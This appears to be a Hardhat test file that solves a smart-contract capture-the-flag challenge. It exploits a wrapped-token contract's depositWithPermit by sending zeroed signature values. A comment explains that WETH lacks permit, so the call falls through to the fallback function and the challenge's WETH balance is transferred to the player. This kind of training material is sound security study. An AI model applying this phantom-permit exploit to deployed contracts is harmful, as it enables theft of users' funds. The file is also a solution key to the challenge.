import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { WrappedERC20, WrappedERC20Challenge, WETHMock } from '../typechain-types'
import { toWei } from './helpers/utils'

describe('WrappedERC20Challenge', async function () {
  let player: SignerWithAddress
  let challenge: WrappedERC20Challenge

  beforeEach(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('WrappedERC20Challenge')
    challenge = (await Challenge.deploy({
      value: toWei('10'),
    })) as WrappedERC20Challenge
  })

  it('Attack', async function () {
    const WETH = (await ethers.getContractFactory('WETHMock')).attach(
      await challenge.WETH()
    ) as WETHMock

    const wwETH = (await ethers.getContractFactory('WrappedERC20')).attach(
      await challenge.wwETH()
    ) as WrappedERC20

    // the contract calls permit on the underlying asset (WETH) which doesn't exist
    // and gets through due to the fallback function, allowing the transferFrom to be executed
    const balance = await WETH.balanceOf(challenge.address);

    await wwETH.depositWithPermit(
      challenge.address,           // from
      balance,                     // value
      ethers.constants.MaxUint256, // deadline
      0,                           // v
      ethers.constants.HashZero,   // r
      ethers.constants.HashZero,   // s
      player.address,              // to
    );

    expect(await challenge.isSolved()).to.be.true
  })
})
